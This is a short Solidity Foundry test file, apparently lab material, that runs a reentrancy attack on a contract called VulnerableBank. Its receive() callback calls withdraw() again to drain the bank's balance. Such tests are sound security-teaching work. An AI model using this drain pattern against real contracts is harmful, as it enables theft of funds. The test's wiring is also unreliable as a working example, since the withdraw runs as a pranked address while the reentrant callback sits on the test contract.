//SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";

contract VulnerableBankTest is Test {
    VulnerableBank vulnerableBank;
    uint256 initialAttackerBalance = 10 ether;
    address attacker = vm.addr(1);
    address user = vm.addr(2);

    function setUp() public {
        vulnerableBank = new VulnerableBank();
    }

    function testAtack() public {
        uint256 amount_ = 1 ether;
        vm.deal(attacker, initialAttackerBalance);
        vm.startPrank(attacker);
        vulnerableBank.deposit{value: amount_}();
        vulnerableBank.withdraw();
        vm.stopPrank();
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw();
        }
    }
}
